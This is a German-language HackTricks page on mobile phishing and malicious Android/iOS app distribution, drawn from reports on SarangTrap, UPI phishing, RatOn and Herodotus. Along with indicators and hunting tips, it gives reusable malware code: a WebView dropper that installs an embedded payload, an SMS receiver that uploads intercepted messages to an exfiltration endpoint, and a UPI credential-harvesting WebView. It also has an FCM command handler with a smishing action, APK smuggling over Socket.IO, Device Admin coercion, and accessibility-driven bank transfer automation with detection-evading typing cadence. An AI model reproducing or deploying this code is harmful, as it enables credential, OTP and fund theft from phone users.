# Mobile Phishing & Verbreitung bösartiger Apps (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, die von Bedrohungsakteuren zur Verbreitung von **malicious Android APKs** und **iOS mobile-configuration profiles** durch Phishing (SEO, Social Engineering, Fake-Stores, Dating-Apps usw.) verwendet werden.
> Das Material basiert auf der SarangTrap-Kampagne, die von Zimperium zLabs (2025) veröffentlicht wurde, sowie auf weiterer öffentlicher Forschung.

## Angriffsablauf

1. **SEO/Phishing Infrastructure**
* Registriere Dutzende ähnlicher Domains (Dating, cloud share, car service…).
– Verwende lokale Sprach-Keywords und Emojis im `<title>`-Element, um bei Google zu ranken.
– Hoste *both* Android (`.apk`) und iOS-Installationsanweisungen auf derselben Landing Page.
2. **First Stage Download**
* Android: direkter Link zu einer *unsigned* oder “third-party store” APK.
* iOS: `itms-services://` oder ein einfacher HTTPS-Link zu einem bösartigen **mobileconfig** profile (siehe unten).
3. **Post-install Social Engineering**
* Beim ersten Start fragt die App nach einem **Einladungs-/Verifizierungscode** (Illusion exklusiven Zugangs).
* Der Code wird **per HTTP POST** an das Command-and-Control (C2) gesendet.
* C2 antwortet `{"success":true}` ➜ Malware setzt fort.
* Sandbox-/AV-Dynamikanalysen, die niemals einen gültigen Code absenden, sehen **kein bösartiges Verhalten** (Evasion).
4. **Runtime Permission Abuse** (Android)
* Gefährliche Berechtigungen werden erst **nach positiver C2-Antwort** angefragt:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Neuere Varianten **entfernen `<uses-permission>` für SMS aus dem `AndroidManifest.xml`**, lassen aber den Java/Kotlin-Codepfad, der SMS per Reflection liest, intakt ⇒ senkt den statischen Score, bleibt aber auf Geräten funktionsfähig, die die Berechtigung via `AppOps`-Missbrauch oder ältere Ziele gewähren.
5. **Facade UI & Background Collection**
* Die App zeigt harmlose Views (SMS-Viewer, Gallery Picker), lokal implementiert.
* Gleichzeitig exfiltriert sie:
- IMEI / IMSI, Telefonnummer
- Vollständiges `ContactsContract`-Dump (JSON-Array)
- JPEG/PNG aus `/sdcard/DCIM`, mit [Luban](https://github.com/Curzibn/Luban) komprimiert, um die Größe zu reduzieren
- Optional SMS-Inhalte (`content://sms`)
Payloads werden **stapelweise gezippt** und per `HTTP POST /upload.php` gesendet.
6. **iOS Delivery Technique**
* Ein einzelnes **mobile-configuration profile** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. anfordern, um das Gerät in eine „MDM“-ähnliche Betreuung einzuschreiben.
* Social-Engineering-Anweisungen:
1. Öffne Settings ➜ *Profile downloaded*.
2. Tippe dreimal auf *Install* (Screenshots auf der Phishing-Seite).
3. Vertraue dem unsignierten Profile ➜ Angreifer erhält *Contacts* & *Photo* entitlements ohne App Store Review.
7. **Network Layer**
* Plain HTTP, oft auf Port 80 mit HOST-Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Red-Team Tipps

* **Dynamic Analysis Bypass** – Während der Malware-Analyse die Einladungscode-Phase mit Frida/Objection automatisieren, um den bösartigen Zweig zu erreichen.
* **Manifest vs. Runtime Diff** – Vergleiche `aapt dump permissions` mit der Laufzeit-Ausgabe von `PackageManager#getRequestedPermissions()`; fehlende gefährliche Perms sind ein Indikator.
* **Network Canary** – Konfiguriere `iptables -p tcp --dport 80 -j NFQUEUE`, um unregelmäßige POST-Bursts nach Code-Eingabe zu detektieren.
* **mobileconfig Inspection** – Nutze `security cms -D -i profile.mobileconfig` auf macOS, um `PayloadContent` aufzulisten und übermäßige Entitlements zu erkennen.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: Einladungscode automatisch umgehen</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indikatoren (generisch)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Dieses Muster wurde in Kampagnen beobachtet, die Themen zu staatlichen Leistungen missbrauchen, um indische UPI-Zugangsdaten und OTPs zu stehlen. Betreiber verketten vertrauenswürdige Plattformen für Verbreitung und Resilienz.

### Delivery chain across trusted platforms
- YouTube-Video-Köder → Beschreibung enthält einen Kurzlink
- Kurzlink → GitHub Pages-Phishingseite, die das legitime Portal imitiert
- Dasselbe GitHub-Repo hostet eine APK mit einem gefälschten “Google Play”-Badge, das direkt zur Datei verlinkt
- Dynamische Phishing-Seiten liegen auf Replit; der entfernte Befehlskanal verwendet Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Die erste APK ist ein Installer (dropper), der die eigentliche Malware unter `assets/app.apk` mitliefert und den Benutzer auffordert, Wi‑Fi/mobile data zu deaktivieren, um cloudbasierte Erkennung zu erschweren.
- Der eingebettete payload installiert sich unter einer harmlosen Bezeichnung (z. B. “Secure Update”). Nach der Installation sind sowohl der Installer als auch das payload als separate Apps vorhanden.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamische Endpoint-Erkennung via shortlink
- Malware ruft von einem shortlink eine im Klartext vorliegende, durch Kommas getrennte Liste von live endpoints ab; einfache String-Transformationen erzeugen den finalen phishing page path.

Beispiel (saniert):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Der Schritt “Make payment of ₹1 / UPI‑Lite” lädt ein bösartiges HTML-Formular vom dynamischen Endpoint innerhalb einer WebView und erfasst sensible Felder (Telefonnummer, Bank, UPI PIN), die per `POST` an `addup.php` gesendet werden.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation und SMS/OTP interception
- Aggressive Berechtigungen werden beim ersten Start angefordert:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte werden zyklisch durchlaufen, um smishing-SMS massenhaft vom Gerät des Opfers zu verschicken.
- Eingehende SMS werden von einem broadcast receiver abgefangen und zusammen mit Metadaten (Absender, Inhalt, SIM-Slot, gerätespezifische Zufalls-ID) an `/addsm.php` hochgeladen.

Receiver-Skizze:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) als robustes C2
- Die Payload registriert sich bei Firebase Cloud Messaging (FCM); push messages tragen ein `_type`-Feld, das als Schalter verwendet wird, um Aktionen auszulösen (z. B. update phishing text templates, toggle behaviours).

Beispiel FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler-Skizze:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indikatoren/IOCs
- APK enthält sekundäre Nutzlast unter `assets/app.apk`
- WebView lädt Zahlungen von `gate.htm` und exfiltriert sie an `/addup.php`
- SMS-Exfiltration zu `/addsm.php`
- Shortlink-gesteuerter Config-Abruf (z. B. `rebrand.ly/*`) der CSV-Endpunkte zurückgibt
- Apps, die als generisch “Update/Secure Update” gekennzeichnet sind
- FCM `data`-Nachrichten mit einem `_type`-Diskriminator in nicht vertrauenswürdigen Apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Angreifer ersetzen statische APK-Links zunehmend durch einen in Google Play–ähnlichen Ködern eingebetteten Socket.IO/WebSocket-Kanal. Dies verschleiert die Payload-URL, umgeht URL-/Extension-Filter und bewahrt ein realistisches Install-UX.

Typischer Client-Ablauf, in freier Wildbahn beobachtet:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Warum es einfache Kontrollen umgeht:
- Es wird keine statische APK-URL offengelegt; die Payload wird im Speicher aus WebSocket-Frames rekonstruiert.
- URL-/MIME-/Extension-Filter, die direkte .apk-Antworten blockieren, können binäre Daten, die via WebSockets/Socket.IO getunnelt werden, übersehen.
- Crawler und URL-Sandboxes, die keine WebSockets ausführen, rufen die Payload nicht ab.

Siehe auch WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Die RatOn banker/RAT-Kampagne (ThreatFabric) ist ein konkretes Beispiel dafür, wie moderne mobile Phishing-Operationen WebView-Dropper, Accessibility-gesteuerte UI-Automation, Overlays/Ransom, Device Admin-Koerzierung, Automated Transfer System (ATS), crypto wallet takeover und sogar NFC-relay-Orchestrierung kombinieren. Dieser Abschnitt abstrahiert die wiederverwendbaren Techniken.

### Stage-1: WebView → native install bridge (dropper)
Angreifer zeigen ein WebView, das auf eine Angreifer-Seite verweist, und injizieren eine JavaScript-Schnittstelle, die einen nativen Installer exponiert. Ein Tippen auf einen HTML-Button ruft nativen Code auf, der eine in den Assets des Dropper gebündelte Second-Stage-APK installiert und diese anschließend direkt startet.

Minimales Muster:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML auf der Seite:
```html
<button onclick="bridge.installApk()">Install</button>
```
Nach der Installation startet der dropper die payload über ein explizites package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting-Idee: nicht vertrauenswürdige Apps, die `addJavascriptInterface()` aufrufen und dem WebView installerähnliche Methoden exponieren; APK, die ein eingebettetes sekundäres payload unter `assets/` mitliefert und die Package Installer Session API aufruft.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 öffnet ein WebView, das eine „Access“-Seite hostet. Ihr Button ruft eine exportierte Methode auf, die das Opfer zu den Accessibility-Einstellungen navigiert und das Aktivieren des bösartigen Dienstes anfragt. Nach Gewährung nutzt die Malware Accessibility, um nachfolgende Runtime-Berechtigungsdialoge (contacts, overlay, manage system settings, etc.) programmatisch zu akzeptieren und fordert Device Admin an.

- Accessibility hilft programmatisch, spätere Prompts zu akzeptieren, indem es Buttons wie “Allow”/“OK” im Node-Tree findet und Klicks auslöst.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Siehe auch:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay-Phishing/Erpressung über WebView
Operatoren können Befehle ausgeben, um:
- ein Vollbild-Overlay von einer URL anzuzeigen, oder
- inline HTML zu übergeben, das in ein WebView-Overlay geladen wird.

Wahrscheinliche Verwendungsfälle: Zwang (PIN-Eingabe), Öffnen von Wallets zum Abfangen von PINs, Erpressungsnachrichten. Behalte einen Befehl bei, um sicherzustellen, dass die Overlay-Berechtigung erteilt ist, falls sie fehlt.

### Fernsteuerungsmodell – textlicher Pseudo-Screen + screen-cast
- Geringe Bandbreite: periodisch den Accessibility node tree dumpen, sichtbare Texte/Rollen/Bounds serialisieren und als Pseudo-Screen an C2 senden (Befehle wie `txt_screen` einmalig und `screen_live` kontinuierlich).
- Hohe Detailtreue: MediaProjection anfordern und bei Bedarf screen-casting/recording starten (Befehle wie `display` / `record`).

### ATS-Playbook (Bank-App-Automation)
Anhand einer JSON-Task die Bank-App öffnen, die UI via Accessibility mit einer Mischung aus Textabfragen und Koordinaten-Taps steuern und die Zahlungs-PIN des Opfers eingeben, wenn dazu aufgefordert.

Beispiel-Task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Beispieltexte, gesehen in einem Zielablauf (CZ → EN):
- "Nová platba" → "Neue Zahlung"
- "Zadat platbu" → "Zahlung eingeben"
- "Nový příjemce" → "Neuer Empfänger"
- "Domácí číslo účtu" → "Inländische Kontonummer"
- "Další" → "Weiter"
- "Odeslat" → "Senden"
- "Ano, pokračovat" → "Ja, fortfahren"
- "Zaplatit" → "Bezahlen"
- "Hotovo" → "Fertig"

Operatoren können Überweisungsgrenzen auch per Befehlen wie `check_limit` und `limit` prüfen/erhöhen; diese navigieren ähnlich durch die Limits-UI.

### Crypto wallet seed extraction
Ziele wie MetaMask, Trust Wallet, Blockchain.com, Phantom. Ablauf: entsperren (gestohlener PIN oder bereitgestelltes Passwort), zu Security/Recovery navigieren, Seed-Phrase anzeigen/aufdecken, keylog/exfiltrate it. Implementiere locale-aware selectors (EN/RU/CZ/SK), um die Navigation über verschiedene Sprachen hinweg zu stabilisieren.

### Device Admin coercion
Device Admin APIs werden verwendet, um die Möglichkeiten zur PIN-Erfassung zu erhöhen und das Opfer zu frustrieren:

- Sofortige Sperre:
```java
dpm.lockNow();
```
- Aktuelle Anmeldeinformationen ablaufen lassen, um eine Änderung zu erzwingen (Accessibility erfasst neue PIN/Passwort):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Erzwinge nicht-biometrische Entsperrung, indem du die biometrischen Keyguard-Funktionen deaktivierst:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Hinweis: Viele DevicePolicyManager-Kontrollen erfordern Device Owner/Profile Owner auf aktuellen Android-Versionen; einige OEM-Builds können nachlässig sein. Immer auf Ziel-OS/OEM validieren.

### NFC-Relay-Orchestrierung (NFSkate)
Stage-3 kann ein externes NFC-relay-Modul installieren und starten (z. B. NFSkate) und ihm sogar eine HTML-Vorlage übergeben, um das Opfer während des Relays zu führen. Das ermöglicht kontaktloses card-present Cash-out neben online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator-Befehlssatz (Beispiel)
- UI/Zustand: `txt_screen`, `screen_live`, `display`, `record`
- Soziales: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Gerät: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Kommunikation/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-getriebene ATS-Anti-Erkennung: menschliche Textkadenz und duale Texteinspritzung (Herodotus)

Threat actors mischen zunehmend Accessibility-getriebene Automation mit Anti-Erkennungsmaßnahmen, die gegen grundlegende Verhaltensbiometrie getuned sind. Ein aktueller banker/RAT zeigt zwei komplementäre Textliefer-Modi und einen Operator-Schalter, um menschliches Tippen mit randomisierter Kadenz zu simulieren.

- Discovery-Modus: sichtbare Nodes mit Selectors und bounds aufzählen, um Eingaben präzise anzusprechen (ID, text, contentDescription, hint, bounds), bevor gehandelt wird.
- Duale Texteinspritzung:
- Modus 1 – `ACTION_SET_TEXT` direkt auf das Ziel-Node (stabil, keine Tastatur);
- Modus 2 – Clipboard setzen + `ACTION_PASTE` in das fokussierte Node (funktioniert, wenn direktes setText blockiert ist).
- Menschliche Kadenz: die vom Operator bereitgestellte Zeichenkette aufteilen und Zeichen für Zeichen mit randomisierten 300–3000 ms Verzögerungen zwischen den Events liefern, um Heuristiken für “machine-speed typing” zu umgehen. Implementiert entweder durch progressives Vergrößern des Wertes via `ACTION_SET_TEXT` oder durch Einfügen eines Zeichens nach dem anderen.

<details>
<summary>Java-Skizze: Node-Erkennung + verzögerte Eingabe pro Zeichen via setText oder clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blockierende Overlays zur Verschleierung von Betrug:
- Ein vollbildiges `TYPE_ACCESSIBILITY_OVERLAY` mit vom Operator gesteuerter Opazität anzeigen; gegenüber dem Opfer undurchsichtig halten, während die Remote-Automatisierung darunter weiterläuft.
- Typischerweise verfügbare Befehle: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimales Overlay mit einstellbarem Alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Häufig beobachtete Operator-Kontrollprimitive: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (Bildschirmfreigabe).

## Referenzen

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
